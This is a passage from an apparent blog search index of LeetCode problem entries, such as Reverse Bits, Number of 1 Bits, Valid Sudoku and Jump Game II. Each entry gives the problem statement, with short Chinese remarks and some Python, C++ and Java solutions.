Questions","CTCI-COMPLETE-LIST"],"tags":["Math"]},{"title":"leetcode-179 - Largest Number","url":"/2021/01/leetcode-179/","content":"動機\n原本以為只要挑數字最大的就好…\n\nProblem\nGiven a list of non-negative integers nums, arrange them such that they form the largest number.Note: The result may be very large, so you need to return a string instead of an integer. Example 1:Input: nums = [10,2]Output: 210Example 2:Input: nums = [3,30,34,5,9]Output: 9534330Example 3:Input: nums = [1]Output: 1Example 4:Input: nums = [10]Output: 10 Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["String","Greedy","Sorting"]},{"title":"leetcode-188 - Best Time to Buy and Sell Stock IV","url":"/2021/01/leetcode-188/","content":"動機\n在dp中看到mutual recursion\n這裡不管效率，都是用top-down的方式寫，除了最終版本\n這應該是繼burst ballon之後看過最有趣的DP了\n\nProblem\nYou are given an integer array prices where prices[i] is the price of a given stock on the ith day, and an integer k.Find the maximum profit you can achieve. You may complete at most k transactions.Note: You may not engage in multiple transactions simultaneously (i.e., you must sell the stock before you buy again). Example 1:Input: k = 2, prices = [2,4,1]Output: 2Explanation: Buy on day 1 (price = 2) and sell on day 2 (price = 4), profit = 4-2 = 2.Example 2:Input: k = 2, prices = [3,2,6,5,0,3]Output: 7Explanation: Buy on day 2 (price = 2) and sell on day 3 (price = 6), profit = 6-2 = 4. Then buy on day 5 (price = 0) and sell on day 6 (price = 3), profit = 3-0 = 3. Constraints:0 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Array"]},{"title":"leetcode-190 - Reverse Bits","url":"/2021/01/leetcode-190/","content":"動機\n神奇的位元操作\n\nProblem\nReverse bits of a given 32 bits unsigned integer.Note:Note that in some languages such as Java, there is no unsigned integer type. In this case, both input and output will be given as a signed integer type. They should not affect your implementation, as the integer's internal binary representation is the same, whether it is signed or unsigned.In Java, the compiler represents the signed integers using 2's complement notation. Therefore, in Example 2 above, the input represents the signed integer -3 and the output represents the signed integer -1073741825.Follow up:If this function is called many times, how would you optimize it? Example 1:Input: n = 00000010100101000001111010011100Output:    964176192 (00111001011110000010100101000000)Explanation: The input binary string 00000010100101000001111010011100 represents the unsigned integer 43261596, so return 964176192 which its binary representation is 00111001011110000010100101000000.Example 2:Input: n = 11111111111111111111111111111101Output:   3221225471 (10111111111111111111111111111111)Explanation: The input binary string 11111111111111111111111111111101 represents the unsigned integer 4294967293, so return 3221225471 which its binary representation is 10111111111111111111111111111111. Constraints:The input must be a binary string of length 32\nSol1: reverse by bit\n就一般的reverse\nclass Solution:    def reverseBits(self, n: int) -&gt; int:        n = list(format(n,&#x27;b&#x27;).zfill(32))        for i in range(16):            tmp = n[i]            n[i] = n[31-i]            n[31-i] = tmp        return int(&#x27;&#x27;.join(n),2)\nSol2: reverse by byte\n在ref中有在不用shift的byte reverse，因為變成byte，所以可能會看過重複的\n進而可以用記憶法!!\n這真的很有趣，在bit下就不能用記憶法，但是如果包成byte就可以用記憶法了，有趣!!\nclass Solution:    # @param n, an integer    # @return an integer    def reverseBits(self, n):        ret, power = 0, 24        while n:            ret += self.reverseByte(n &amp; 0xff) &lt;&lt; power            n = n &gt;&gt; 8            power -= 8        return ret    # memoization with decorator    @functools.lru_cache(maxsize=256)    def reverseByte(self, byte):        return (byte * 0x0202020202 &amp; 0x010884422010) % 1023\nSol3: divide &amp; conquer\n切兩半，再交換，藉著在每個分區都做一樣的事\n不過因為是固定32位，所以可以直接用shift\nclass Solution:    # @param n, an integer    # @return an integer    def reverseBits(self, n):        n = (n &gt;&gt; 16) | (n &lt;&lt; 16)        n = ((n &amp; 0xff00ff00) &gt;&gt; 8) | ((n &amp; 0x00ff00ff) &lt;&lt; 8)        n = ((n &amp; 0xf0f0f0f0) &gt;&gt; 4) | ((n &amp; 0x0f0f0f0f) &lt;&lt; 4)        n = ((n &amp; 0xcccccccc) &gt;&gt; 2) | ((n &amp; 0x33333333) &lt;&lt; 2)        n = ((n &amp; 0xaaaaaaaa) &gt;&gt; 1) | ((n &amp; 0x55555555) &lt;&lt; 1)        return n\nSol4: push\nclass Solution &#123;public:    uint32_t reverseBits(uint32_t n) &#123;        uint32_t ret = 0;        for (int i=0; i&lt;31; i++, n &gt;&gt;= 1, ret &lt;&lt;= 1) &#123;                ret = ret | (n&amp;1);        &#125;        if (n)            ret = ret | (n&amp;1);        return ret;    &#125;&#125;;\nRef\nBit Twiddling Hacks\n","categories":["Algorithm","Leetcode","Top Interview Questions","Blind Curated 75"],"tags":["Bit Manipulation","Divide and Conquer"]},{"title":"leetcode-191 - Number of 1 Bits","url":"/2021/01/leetcode-191/","content":"動機\n雖然說是水題，但是在LC的Solution中，卻有一個有趣的解法\n\nProblem\nWrite a function that takes an unsigned integer and returns the number of '1' bits it has (also known as the Hamming weight).Note:Note that in some languages, such as Java, there is no unsigned integer type. In this case, the input will be given as a signed integer type. It should not affect your implementation, as the integer's internal binary representation is the same, whether it is signed or unsigned.In Java, the compiler represents the signed integers using 2's complement notation. Therefore, in Example 3, the input represents the signed integer. -3. Example 1:Input: n = 00000000000000000000000000001011Output: 3Explanation: The input binary string 00000000000000000000000000001011 has a total of three '1' bits.Example 2:Input: n = 00000000000000000000000010000000Output: 1Explanation: The input binary string 00000000000000000000000010000000 has a total of one '1' bit.Example 3:Input: n = 11111111111111111111111111111101Output: 31Explanation: The input binary string 11111111111111111111111111111101 has a total of thirty one '1' bits. Constraints:The input must be a binary string of length 32. Follow up: If this function is called many times, how would you optimize it?\nSol1\n一直除2看有幾次奇數\nclass Solution:    def hammingWeight(self, n: int) -&gt; int:        ret = 0        while n != 0:            if n % 2 == 1:                ret += 1            n = n//2        return ret\nCase study\n10轉成binary，是 01010\n如果10-1會從離左手邊最近的1借位，所以會變成 01001\n注意到，到左手邊最近的1之間的所有0，都變成1了!!\n同時因為借位，所以最近的1變成0\n最後只要與原本的數字做AND，就會把 左手邊最近的1之間的所有1 ，都變成0了!!\n01010 (10)[-1]01001 (9)[&amp;n]01000 (8)\n這樣只要到0之前一直這樣做就好了!!\npublic int hammingWeight(int n) &#123;    int sum = 0;    while (n != 0) &#123;        sum++;        n &amp;= (n - 1);    &#125;    return sum;&#125;","categories":["Algorithm","Leetcode","Top Interview Questions","Blind Curated 75"],"tags":["Bit Manipulation"]},{"title":"leetcode-202 - Happy Number","url":"/2021/01/leetcode-202/","content":"動機\n就是算\n\nProblem\nWrite an algorithm to determine if a number n is happy.A happy number is a number defined by the following process:Starting with any positive integer, replace the number by the sum of the squares of its digits.Repeat the process until the number equals 1 (where it will stay), or it loops endlessly in a cycle which does not include 1.Those numbers for which this process ends in 1 are happy.Return true if n is a happy number, and false if not. Example 1:Input: n = 19Output: trueExplanation:12 + 92 = 8282 + 22 = 6862 + 82 = 10012 + 02 + 02 = 1Example 2:Input: n = 2Output: false Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Math","Two Pointers","Hash Table"]},{"title":"leetcode-208 - Implement Trie (Prefix Tree)","url":"/2021/01/leetcode-208/","content":"動機\n就是trie\n\nProblem\nA trie (pronounced as try) or prefix tree is a tree data structure used to efficiently store and retrieve keys in a dataset of strings. There are various applications of this data structure, such as autocomplete and spellchecker.Implement the Trie class:Trie() Initializes the trie object.void insert(String word) Inserts the string word into the trie.boolean search(String word) Returns true if the string word is in the trie (i.e., was inserted before), and false otherwise.boolean startsWith(String prefix) Returns true if there is a previously inserted string word that has the prefix prefix, and false otherwise. Example 1:Input[Trie, insert, search, search, startsWith, insert, search][[], [apple], [apple], [app], [app], [app], [app]]Output[null, null, true, false, true, null, true]ExplanationTrie trie = new Trie();trie.insert(apple);trie.search(apple);   // return Truetrie.search(app);     // return Falsetrie.startsWith(app); // return Truetrie.insert(app);trie.search(app);     // return True Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["String","Design","Hash Table","Trie"]},{"title":"leetcode-211 - Design Add and Search Words Data Structure","url":"/2021/01/leetcode-211/","content":"動機\n原本就直接用trie，但看了別的解答才發現可以看長度來區分再直接比!!\n重點是這樣居然比較快!! (in Py)\n\nProblem\nDesign a data structure that supports adding new words and finding if a string matches any previously added string.Implement the WordDictionary class:WordDictionary() Initializes the object.void addWord(word) Adds word to the data structure, it can be matched later.bool search(word) Returns true if there is any string in the data structure that matches word or false otherwise. word may contain dots '.' where dots can be matched with any letter. Example:Input[WordDictionary,addWord,addWord,addWord,search,search,search,search][[],[bad],[dad],[mad],[pad],[bad],[.ad],[b..]]Output[null,null,null,null,false,true,true,true]ExplanationWordDictionary wordDictionary = new WordDictionary();wordDictionary.addWord(bad);wordDictionary.addWord(dad);wordDictionary.addWord(mad);wordDictionary.search(pad); // return FalsewordDictionary.search(bad); // return TruewordDictionary.search(.ad); // return TruewordDictionary.search(b..); // return True Constraints:1 ","categories":["Algorithm","Leetcode","Blind Curated 75"],"tags":["String","Depth-First Search","Design","Trie"]},{"title":"leetcode-212 - Word Search II","url":"/2021/01/leetcode-212/","content":"動機\n原來lru_cache搭配dfs可以達到判有沒有visited的效果!!\n\nProblem\nGiven an m x n board of characters and a list of strings words, return all words on the board.Each word must be constructed from letters of sequentially adjacent cells, where adjacent cells are horizontally or vertically neighboring. The same letter cell may not be used more than once in a word. Example 1:Input: board = [[o,a,a,n],[e,t,a,e],[i,h,k,r],[i,f,l,v]], words = [oath,pea,eat,rain]Output: [eat,oath]Example 2:Input: board = [[a,b],[c,d]], words = [abcb]Output: [] Constraints:m == board.lengthn == board[i].length1 ","categories":["Algorithm","Leetcode","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["String","Array","Matrix","Trie","Backtracking"]},{"title":"leetcode-217 - Contains Duplicate","url":"/2021/01/leetcode-217/","content":"動機\n水題\n\nProblem\nGiven an integer array nums, return true if any value appears at least twice in the array, and return false if every element is distinct. Example 1:Input: nums = [1,2,3,1]Output: trueExample 2:Input: nums = [1,2,3,4]Output: falseExample 3:Input: nums = [1,1,1,3,3,4,3,2,4,2]Output: true Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions","seanprashad","CTCI-COMPLETE-LIST","Blind Curated 75"],"tags":["Array","Hash Table","Sorting"]},{"title":"leetcode-219 - Contains Duplicate II","url":"/2021/01/leetcode-219/","content":"動機\n從 數量 或 距離\n\nProblem\nGiven an integer array nums and an integer k, return true if there are two distinct indices i and j in the array such that nums[i] == nums[j] and abs(i - j) ","categories":["Algorithm","Leetcode"],"tags":["Array","Hash Table","Sliding Window"]},{"title":"leetcode-230 - Kth Smallest Element in a BST","url":"/2021/01/leetcode-230/","content":"動機\n不要被BST誤導阿!!!\n一直往O(log(n))的方向去想\n\nProblem\nGiven the root of a binary search tree, and an integer k, return the kth (1-indexed) smallest element in the tree. Example 1:Input: root = [3,1,4,null,2], k = 1Output: 1Example 2:Input: root = [5,3,6,2,4,null,null,1], k = 3Output: 3 Constraints:The number of nodes in the tree is n.1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Depth-First Search","Binary Tree","Tree","Binary Search Tree"]},{"title":"leetcode-239 - Sliding Window Maximum","url":"/2021/01/leetcode-239/","content":"動機\n從sliding window到寫merge interval的變化版\n\nProblem\nYou are given an array of integers nums, there is a sliding window of size k which is moving from the very left of the array to the very right. You can only see the k numbers in the window. Each time the sliding window moves right by one position.Return the max sliding window. Example 1:Input: nums = [1,3,-1,-3,5,3,6,7], k = 3Output: [3,3,5,5,6,7]Explanation: Window position                Max---------------               -----[1  3  -1] -3  5  3  6  7       3 1 [3  -1  -3] 5  3  6  7       3 1  3 [-1  -3  5] 3  6  7       5 1  3  -1 [-3  5  3] 6  7       5 1  3  -1  -3 [5  3  6] 7       6 1  3  -1  -3  5 [3  6  7]      7Example 2:Input: nums = [1], k = 1Output: [1]Example 3:Input: nums = [1,-1], k = 1Output: [1,-1]Example 4:Input: nums = [9,11], k = 2Output: [11]Example 5:Input: nums = [4,-2], k = 2Output: [4] Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad"],"tags":["Array","Heap (Priority Queue)","Sliding Window","Monotonic Queue","Queue"]},{"title":"leetcode-289 - Game of Life","url":"/2021/01/leetcode-289/","content":"動機\n用數字代表狀態變化\n\nProblem\nAccording to Wikipedia's article: The Game of Life, also known simply as Life, is a cellular automaton devised by the British mathematician John Horton Conway in 1970.The board is made up of an m x n grid of cells, where each cell has an initial state: live (represented by a 1) or dead (represented by a 0). Each cell interacts with its eight neighbors (horizontal, vertical, diagonal) using the following four rules (taken from the above Wikipedia article):Any live cell with fewer than two live neighbors dies as if caused by under-population.Any live cell with two or three live neighbors lives on to the next generation.Any live cell with more than three live neighbors dies, as if by over-population.Any dead cell with exactly three live neighbors becomes a live cell, as if by reproduction.The next state is created by applying the above rules simultaneously to every cell in the current state, where births and deaths occur simultaneously. Given the current state of the m x n grid board, return the next state. Example 1:Input: board = [[0,1,0],[0,0,1],[1,1,1],[0,0,0]]Output: [[0,0,0],[1,0,1],[0,1,1],[0,1,0]]Example 2:Input: board = [[1,1],[1,0]]Output: [[1,1],[1,1]] Constraints:m == board.lengthn == board[i].length1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Array","Matrix","Simulation"]},{"title":"leetcode-297 - Serialize and Deserialize Binary Tree","url":"/2021/01/leetcode-297/","content":"動機\n原來 中序加前序去重建tree是有限制的，val不能重複!!\n\nProblem\nSerialization is the process of converting a data structure or object into a sequence of bits so that it can be stored in a file or memory buffer, or transmitted across a network connection link to be reconstructed later in the same or another computer environment.Design an algorithm to serialize and deserialize a binary tree. There is no restriction on how your serialization/deserialization algorithm should work. You just need to ensure that a binary tree can be serialized to a string and this string can be deserialized to the original tree structure.Clarification: The input/output format is the same as how LeetCode serializes a binary tree. You do not necessarily need to follow this format, so please be creative and come up with different approaches yourself. Example 1:Input: root = [1,2,3,null,null,4,5]Output: [1,2,3,null,null,4,5]Example 2:Input: root = []Output: []Example 3:Input: root = [1]Output: [1]Example 4:Input: root = [1,2]Output: [1,2] Constraints:The number of nodes in the tree is in the range [0, 104].-1000 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["String","Breadth-First Search","Depth-First Search","Design","Binary Tree","Tree"]},{"title":"leetcode-309 - Best Time to Buy and Sell Stock with Cooldown","url":"/2021/01/leetcode-309/","content":"動機\n可以當成188的暖身題\n\nProblem\nYou are given an array prices where prices[i] is the price of a given stock on the ith day.Find the maximum profit you can achieve. You may complete as many transactions as you like (i.e., buy one and sell one share of the stock multiple times) with the following restrictions:After you sell your stock, you cannot buy stock on the next day (i.e., cooldown one day).Note: You may not engage in multiple transactions simultaneously (i.e., you must sell the stock before you buy again). Example 1:Input: prices = [1,2,3,0,2]Output: 3Explanation: transactions = [buy, sell, cooldown, buy, sell]Example 2:Input: prices = [1]Output: 0 Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Dynamic Programming","Array"]},{"title":"leetcode-315 - Count of Smaller Numbers After Self","url":"/2021/01/leetcode-315/","content":"動機\nsorted list的index，就是前面有幾個比自己小\nindex也可以這樣用!?\n\nProblem\nYou are given an integer array nums and you have to return a new counts array. The counts array has the property where counts[i] is the number of smaller elements to the right of nums[i]. Example 1:Input: nums = [5,2,6,1]Output: [2,1,1,0]Explanation:To the right of 5 there are 2 smaller elements (2 and 1).To the right of 2 there is only 1 smaller element (1).To the right of 6 there is 1 smaller element (1).To the right of 1 there is 0 smaller element.Example 2:Input: nums = [-1]Output: [0]Example 3:Input: nums = [-1,-1]Output: [0,0] Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Array","Divide and Conquer","Binary Search","Merge Sort","Ordered Set","Segment Tree","Binary Indexed Tree"]},{"title":"leetcode-324 - Wiggle Sort II","url":"/2021/01/leetcode-324/","content":"動機\n神奇的indexing\n\nProblem\nGiven an integer array nums, reorder it such that nums[0] < nums[1] > nums[2] < nums[3]....You may assume the input array always has a valid answer. Example 1:Input: nums = [1,5,1,1,6,4]Output: [1,6,1,5,1,4]Explanation: [1,4,1,5,1,6] is also accepted.Example 2:Input: nums = [1,3,2,2,3,1]Output: [2,3,1,3,1,2] Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Array","Divide and Conquer","Sorting","Quickselect"]},{"title":"leetcode-334 - Increasing Triplet Subsequence","url":"/2021/01/leetcode-334/","content":"動機\n讓我想起之前看有binary search的LIS，多看真的會有靈感\n\nProblem\nGiven an integer array nums, return true if there exists a triple of indices (i, j, k) such that i < j < k and nums[i] < nums[j] < nums[k]. If no such indices exists, return false. Example 1:Input: nums = [1,2,3,4,5]Output: trueExplanation: Any triplet where i < j < k is valid.Example 2:Input: nums = [5,4,3,2,1]Output: falseExplanation: No triplet exists.Example 3:Input: nums = [2,1,5,0,4,6]Output: trueExplanation: The triplet (3, 4, 5) is valid because nums[3] == 0 < nums[4] == 4 < nums[5] == 6. Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Array","Greedy"]},{"title":"leetcode-36 - Valid Sudoku","url":"/2021/01/leetcode-36/","content":"動機\n照題目做\n\nProblem\nDetermine if a 9 x 9 Sudoku board is valid. Only the filled cells need to be validated according to the following rules:Each row must contain the digits 1-9 without repetition.Each column must contain the digits 1-9 without repetition.Each of the nine 3 x 3 sub-boxes of the grid must contain the digits 1-9 without repetition.Note:A Sudoku board (partially filled) could be valid but is not necessarily solvable.Only the filled cells need to be validated according to the mentioned rules. Example 1:Input: board = [[5,3,.,.,7,.,.,.,.],[6,.,.,1,9,5,.,.,.],[.,9,8,.,.,.,.,6,.],[8,.,.,.,6,.,.,.,3],[4,.,.,8,.,3,.,.,1],[7,.,.,.,2,.,.,.,6],[.,6,.,.,.,.,2,8,.],[.,.,.,4,1,9,.,.,5],[.,.,.,.,8,.,.,7,9]]Output: trueExample 2:Input: board = [[8,3,.,.,7,.,.,.,.],[6,.,.,1,9,5,.,.,.],[.,9,8,.,.,.,.,6,.],[8,.,.,.,6,.,.,.,3],[4,.,.,8,.,3,.,.,1],[7,.,.,.,2,.,.,.,6],[.,6,.,.,.,.,2,8,.],[.,.,.,4,1,9,.,.,5],[.,.,.,.,8,.,.,7,9]]Output: falseExplanation: Same as Example 1, except with the 5 in the top left corner being modified to 8. Since there are two 8's in the top left 3x3 sub-box, it is invalid. Constraints:board.length == 9board[i].length == 9board[i][j] is a digit or '.'.\nSol\ndef h(b,i,j):    hi2 = Counter([int(b[x][j]) for x in range(len(b)) if b[x][j] != &quot;.&quot;])    #print(hi2,i,j)    for n in range(1,10):        n = int(n)        #print(hi2.get(n,0))        if hi2.get(n,0) &gt; 1:            return False    return Truedef f(b,i,j):    hi = Counter([int(b[i][x]) for x in range(len(b)) if b[i][x] != &quot;.&quot;])        for n in range(1,10):        n = int(n)        if hi.get(n,0) &gt; 1:            return False    return Truedef g(b,i,j):    hi = set()    for a in range(i,i+3):        for bb in range(j,j+3):            if b[a][bb] != &quot;.&quot;:                if b[a][bb] not in hi:                    hi.add(b[a][bb])                else:                    return True    return Falseclass Solution:    def isValidSudoku(self, b: List[List[str]]) -&gt; bool:        for i in range(0,9,3):            for j in range(0,9,3):                if g(b,i,j):                    return False        return all([h(b,0,j) for j in range(len(b))]) and all([f(b,i,0) for i in range(len(b))])","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Array","Matrix","Hash Table"]},{"title":"leetcode-373 - Find K Pairs with Smallest Sums","url":"/2021/01/leetcode-373/","content":"動機\n要會看input決定要用什麼做法\n\nProblem\nYou are given two integer arrays nums1 and nums2 sorted in ascending order and an integer k.Define a pair (u, v) which consists of one element from the first array and one element from the second array.Return the k pairs (u1, v1), (u2, v2), ..., (uk, vk) with the smallest sums. Example 1:Input: nums1 = [1,7,11], nums2 = [2,4,6], k = 3Output: [[1,2],[1,4],[1,6]]Explanation: The first 3 pairs are returned from the sequence: [1,2],[1,4],[1,6],[7,2],[7,4],[11,2],[7,6],[11,4],[11,6]Example 2:Input: nums1 = [1,1,2], nums2 = [1,2,3], k = 2Output: [[1,1],[1,1]]Explanation: The first 2 pairs are returned from the sequence: [1,1],[1,1],[1,2],[2,1],[1,2],[2,2],[1,3],[1,3],[2,3]Example 3:Input: nums1 = [1,2], nums2 = [3], k = 3Output: [[1,3],[2,3]]Explanation: All possible pairs are returned from the sequence: [1,3],[2,3] Constraints:1 ","categories":["Algorithm","Leetcode","60 questions to solve","seanprashad"],"tags":["Array","Heap (Priority Queue)"]},{"title":"leetcode-377 - Combination Sum IV","url":"/2021/01/leetcode-377/","content":"動機\n有用硬幹的感覺\n\nProblem\nGiven an array of distinct integers nums and a target integer target, return the number of possible combinations that add up to target.The answer is guaranteed to fit in a 32-bit integer. Example 1:Input: nums = [1,2,3], target = 4Output: 7Explanation:The possible combination ways are:(1, 1, 1, 1)(1, 1, 2)(1, 2, 1)(1, 3)(2, 1, 1)(2, 2)(3, 1)Note that different sequences are counted as different combinations.Example 2:Input: nums = [9], target = 3Output: 0 Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Dynamic Programming","Array"]},{"title":"leetcode-378 - Kth Smallest Element in a Sorted Matrix","url":"/2021/01/leetcode-378/","content":"動機\n原來binary search可以這麼用\n\nProblem\nGiven an n x n matrix where each of the rows and columns are sorted in ascending order, return the kth smallest element in the matrix.Note that it is the kth smallest element in the sorted order, not the kth distinct element. Example 1:Input: matrix = [[1,5,9],[10,11,13],[12,13,15]], k = 8Output: 13Explanation: The elements in the matrix are [1,5,9,10,11,12,13,13,15], and the 8th smallest number is 13Example 2:Input: matrix = [[-5]], k = 1Output: -5 Constraints:n == matrix.lengthn == matrix[i].length1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad"],"tags":["Array","Matrix","Binary Search","Heap (Priority Queue)","Sorting"]},{"title":"leetcode-38 - Count and Say","url":"/2021/01/leetcode-38/","content":"動機\n這題的題目敘述真的不太好，夢回接手新任務，霧裡看花，用力撞牆的感覺\n\nProblem\nThe count-and-say sequence is a sequence of digit strings defined by the recursive formula:countAndSay(1) = 1countAndSay(n) is the way you would say the digit string from countAndSay(n-1), which is then converted into a different digit string.To determine how you say a digit string, split it into the minimal number of groups so that each group is a contiguous section all of the same character. Then for each group, say the number of characters, then say the character. To convert the saying into a digit string, replace the counts with a number and concatenate every saying.For example, the saying and conversion for digit string 3322251:Given a positive integer n, return the nth term of the count-and-say sequence. Example 1:Input: n = 1Output: 1Explanation: This is the base case.Example 2:Input: n = 4Output: 1211Explanation:countAndSay(1) = 1countAndSay(2) = say 1 = one 1 = 11countAndSay(3) = say 11 = two 1's = 21countAndSay(4) = say 21 = one 2 + one 1 = 12 + 11 = 1211 Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["String"]},{"title":"leetcode-380 - Insert Delete GetRandom O(1)","url":"/2021/01/leetcode-380/","content":"動機\n真的就是用rand!!\n\nProblem\nImplement the RandomizedSet class:RandomizedSet() Initializes the RandomizedSet object.bool insert(int val) Inserts an item val into the set if not present. Returns true if the item was not present, false otherwise.bool remove(int val) Removes an item val from the set if present. Returns true if the item was present, false otherwise.int getRandom() Returns a random element from the current set of elements (it's guaranteed that at least one element exists when this method is called). Each element must have the same probability of being returned.You must implement the functions of the class such that each function works in average O(1) time complexity. Example 1:Input[RandomizedSet, insert, remove, insert, getRandom, remove, insert, getRandom][[], [1], [2], [2], [], [1], [2], []]Output[null, true, false, true, 2, true, false, 2]ExplanationRandomizedSet randomizedSet = new RandomizedSet();randomizedSet.insert(1); // Inserts 1 to the set. Returns true as 1 was inserted successfully.randomizedSet.remove(2); // Returns false as 2 does not exist in the set.randomizedSet.insert(2); // Inserts 2 to the set, returns true. Set now contains [1,2].randomizedSet.getRandom(); // getRandom() should return either 1 or 2 randomly.randomizedSet.remove(1); // Removes 1 from the set, returns true. Set now contains [2].randomizedSet.insert(2); // 2 was already in the set, so return false.randomizedSet.getRandom(); // Since 2 is the only number in the set, getRandom() will always return 2. Constraints:-231 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Array","Math","Design","Hash Table","Randomized"]},{"title":"leetcode-395 - Longest Substring with At Least K Repeating Characters","url":"/2021/01/leetcode-395/","content":"動機\n搞懂調整sliding window的條件\n\nProblem\nGiven a string s and an integer k, return the length of the longest substring of s such that the frequency of each character in this substring is greater than or equal to k. Example 1:Input: s = aaabb, k = 3Output: 3Explanation: The longest substring is aaa, as 'a' is repeated 3 times.Example 2:Input: s = ababbc, k = 2Output: 5Explanation: The longest substring is ababb, as 'a' is repeated 2 times and 'b' is repeated 3 times. Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["String","Divide and Conquer","Hash Table","Sliding Window"]},{"title":"leetcode-406 - Queue Reconstruction by Height","url":"/2021/01/leetcode-406/","content":"動機\n這應該是最短的leetcode code\n\nProblem\nYou are given an array of people, people, which are the attributes of some people in a queue (not necessarily in order). Each people[i] = [hi, ki] represents the ith person of height hi with exactly ki other people in front who have a height greater than or equal to hi.Reconstruct and return the queue that is represented by the input array people. The returned queue should be formatted as an array queue, where queue[j] = [hj, kj] is the attributes of the jth person in the queue (queue[0] is the person at the front of the queue). Example 1:Input: people = [[7,0],[4,4],[7,1],[5,0],[6,1],[5,2]]Output: [[5,0],[7,0],[5,2],[6,1],[4,4],[7,1]]Explanation:Person 0 has height 5 with no other people taller or the same height in front.Person 1 has height 7 with no other people taller or the same height in front.Person 2 has height 5 with two persons taller or the same height in front, which is person 0 and 1.Person 3 has height 6 with one person taller or the same height in front, which is person 1.Person 4 has height 4 with four people taller or the same height in front, which are people 0, 1, 2, and 3.Person 5 has height 7 with one person taller or the same height in front, which is person 1.Hence [[5,0],[7,0],[5,2],[6,1],[4,4],[7,1]] is the reconstructed queue.Example 2:Input: people = [[6,0],[5,0],[4,0],[3,2],[2,2],[1,4]]Output: [[4,0],[5,0],[2,2],[3,2],[1,4],[6,0]] Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Greedy","Sorting"]},{"title":"leetcode-414 - Third Maximum Number","url":"/2021/01/leetcode-414/","content":"動機\nheapq是不是比較慢啊\n\nProblem\nGiven integer array nums, return the third maximum number in this array. If the third maximum does not exist, return the maximum number. Example 1:Input: nums = [3,2,1]Output: 1Explanation: The third maximum is 1.Example 2:Input: nums = [1,2]Output: 2Explanation: The third maximum does not exist, so the maximum (2) is returned instead.Example 3:Input: nums = [2,2,3,1]Output: 1Explanation: Note that the third maximum here means the third maximum distinct number.Both numbers with value 2 are both considered as second maximum. Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Sorting"]},{"title":"leetcode-416 - Partition Equal Subset Sum","url":"/2021/01/leetcode-416/","content":"動機\n真的就是DPㄟ\n\nProblem\nGiven a non-empty array nums containing only positive integers, find if the array can be partitioned into two subsets such that the sum of elements in both subsets is equal. Example 1:Input: nums = [1,5,11,5]Output: trueExplanation: The array can be partitioned as [1, 5, 5] and [11].Example 2:Input: nums = [1,2,3,5]Output: falseExplanation: The array cannot be partitioned into equal sum subsets. Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","seanprashad"],"tags":["Dynamic Programming","Array"]},{"title":"leetcode-435 - Non-overlapping Intervals","url":"/2021/01/leetcode-435/","content":"動機\n當初想用處理interval的老套路，stack去做，一直gg\n直到看解答才發現，原來這麼簡單\n\nProblem\nGiven an array of intervals intervals where intervals[i] = [starti, endi], return the minimum number of intervals you need to remove to make the rest of the intervals non-overlapping. Example 1:Input: intervals = [[1,2],[2,3],[3,4],[1,3]]Output: 1Explanation: [1,3] can be removed and the rest of the intervals are non-overlapping.Example 2:Input: intervals = [[1,2],[1,2],[1,2]]Output: 2Explanation: You need to remove two [1,2] to make the rest of the intervals non-overlapping.Example 3:Input: intervals = [[1,2],[2,3]]Output: 0Explanation: You don't need to remove any of the intervals since they're already non-overlapping. Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad","Blind Curated 75"],"tags":["Dynamic Programming","Array","Greedy","Sorting"]},{"title":"leetcode-438 - Find All Anagrams in a String","url":"/2021/01/leetcode-438/","content":"動機\n想起優化LC 127的過程\n\nProblem\nGiven two strings s and p, return an array of all the start indices of p's anagrams in s. You may return the answer in any order. Example 1:Input: s = cbaebabacd, p = abcOutput: [0,6]Explanation:The substring with start index = 0 is cba, which is an anagram of abc.The substring with start index = 6 is bac, which is an anagram of abc.Example 2:Input: s = abab, p = abOutput: [0,1,2]Explanation:The substring with start index = 0 is ab, which is an anagram of ab.The substring with start index = 1 is ba, which is an anagram of ab.The substring with start index = 2 is ab, which is an anagram of ab. Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions"],"tags":["String","Hash Table","Sliding Window"]},{"title":"leetcode-448 - Find All Numbers Disappeared in an Array","url":"/2021/01/leetcode-448/","content":"動機\n這題很經典，在programming pearls有出現過\n\nProblem\nGiven an array nums of n integers where nums[i] is in the range [1, n], return an array of all the integers in the range [1, n] that do not appear in nums. Example 1:Input: nums = [4,3,2,7,8,2,3,1]Output: [5,6]Example 2:Input: nums = [1,1]Output: [2] Constraints:n == nums.length1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","seanprashad"],"tags":["Array","Hash Table"]},{"title":"leetcode-45 - Jump Game II","url":"/2021/01/leetcode-45/","content":"動機\n簡單一點也不是壞事，至少算index到找到一個完整的方式去處理之前\n\nProblem\nGiven an array of non-negative integers nums, you are initially positioned at the first index of the array.Each element in the array represents your maximum jump length at that position.Your goal is to reach the last index in the minimum number of jumps.You can assume that you can always reach the 